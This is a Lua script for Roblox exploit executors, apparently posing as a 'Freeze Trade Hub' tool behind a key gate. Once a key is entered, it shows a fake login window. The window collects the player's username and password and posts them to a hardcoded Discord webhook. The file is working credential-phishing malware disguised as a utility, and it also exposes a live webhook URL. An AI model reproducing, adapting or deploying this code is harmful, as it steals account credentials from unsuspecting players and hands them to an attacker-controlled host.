-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi Utama
local function sendToDiscord(username, password)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
        })
    }
    local response
    if syn and syn.request then
        response = syn.request(payload)
    elseif http and http.request then
        response = http.request(payload)
    elseif request then
        response = request(payload)
    else
        print("Executor Anda tidak mendukung HTTP requests!")
        return
    end

    if response and response.StatusCode == 200 then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
    end
end

local function createLoginGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local usernameBox = Instance.new("TextBox")
    local passwordBox = Instance.new("TextBox")
    local loginButton = Instance.new("TextButton")

    gui.Name = "LoginGUI"
    gui.Parent = game.CoreGui

    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.Parent = gui

    usernameBox.PlaceholderText = "Masukkan Username"
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 50)
    usernameBox.Parent = frame

    passwordBox.PlaceholderText = "Masukkan Password"
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 100)
    passwordBox.Parent = frame

    loginButton.Text = "Login"
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 150)
    loginButton.Parent = frame

    loginButton.MouseButton1Click:Connect(function()
        if usernameBox.Text ~= "" and passwordBox.Text ~= "" then
            sendToDiscord(usernameBox.Text, passwordBox.Text)
            gui:Destroy()
        else
            print("Harap isi semua kolom!")
        end
    end)
end

local function createKeyValidationGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local keyBox = Instance.new("TextBox")
    local verifyButton = Instance.new("TextButton")
    local copyLinkButton = Instance.new("TextButton")

    gui.Name = "KeyValidationGUI"
    gui.Parent = game.CoreGui

    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.Parent = gui

    keyBox.PlaceholderText = "Masukkan Key"
    keyBox.Size = UDim2.new(1, -20, 0, 40)
    keyBox.Position = UDim2.new(0, 10, 0, 50)
    keyBox.Parent = frame

    verifyButton.Text = "Verifikasi Key"
    verifyButton.Size = UDim2.new(1, -20, 0, 40)
    verifyButton.Position = UDim2.new(0, 10, 0, 100)
    verifyButton.Parent = frame

    copyLinkButton.Text = "Get Key"
    copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
    copyLinkButton.Position = UDim2.new(0, 10, 0, 150)
    copyLinkButton.Parent = frame

    verifyButton.MouseButton1Click:Connect(function()
        if keyBox.Text == correctKey then
            gui:Destroy()
            createLoginGUI()
        else
            print("Key salah!")
        end
    end)

    copyLinkButton.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard(linkUrl)
            print("Link telah disalin ke clipboard!")
        else
            print("Salin link secara manual: " .. linkUrl)
        end
    end)
end

-- Memulai GUI Key Validation
createKeyValidationGUI()
